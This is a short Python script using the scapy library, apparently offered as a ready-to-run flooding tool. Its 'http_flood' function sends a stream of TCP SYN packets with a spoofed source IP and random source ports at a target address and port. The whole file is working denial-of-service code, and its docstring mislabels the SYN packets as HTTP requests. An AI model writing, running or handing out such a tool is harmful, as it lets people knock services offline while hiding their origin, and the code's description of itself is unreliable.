from scapy.all import IP, TCP, send
import random
import time
# Written by Lithiokride

def http_flood(target_ip, target_port, packet_count, source_ip):
    """
    Sends a specified number of HTTP requests to a target IP with a custom source IP.

    Parameters:
        target_ip (str): The target IP to which the requests will be sent.
        target_port (int): The target port to connect to (e.g., 80 for HTTP).
        packet_count (int): The total number of HTTP requests to send.
        source_ip (str): The custom source IP address to use.
        
    Returns:
        None: This function does not return a value. It prints the number of packets sent.
    """
    
    try:
        for count in range(1, packet_count + 1):
            # Create the IP layer with custom source IP
            ip_packet = IP(src=source_ip, dst=target_ip)
            # Create the TCP layer
            tcp_packet = TCP(sport=random.randint(1024, 65535), dport=target_port, flags='S')

            # Combine IP and TCP layers
            packet = ip_packet / tcp_packet
            
            # Send the packet
            send(packet, verbose=0)

            # Print packet count every 100 packets
            if count % 100 == 0:
                print(f"Packets sent: {count}")

            # Optional: Introduce a small delay between requests
            time.sleep(0.01)  # Adjust delay as needed

    except KeyboardInterrupt:
        print(f"\nStopped. Total packets sent: {count - 1}")

    print(f"Sent {packet_count} HTTP packets to {target_ip}:{target_port} from {source_ip}")

# Example usage
if __name__ == "__main__":
    target_ip = "192.168.1.100"  # Replace with the target IP
    target_port = 80              # Target port for HTTP
    packet_count = 1000           # Number of packets to send
    source_ip = "192.168.1.50"    # Replace with your desired source IP

    # Start the HTTP flood
    http_flood(target_ip, target_port, packet_count, source_ip)
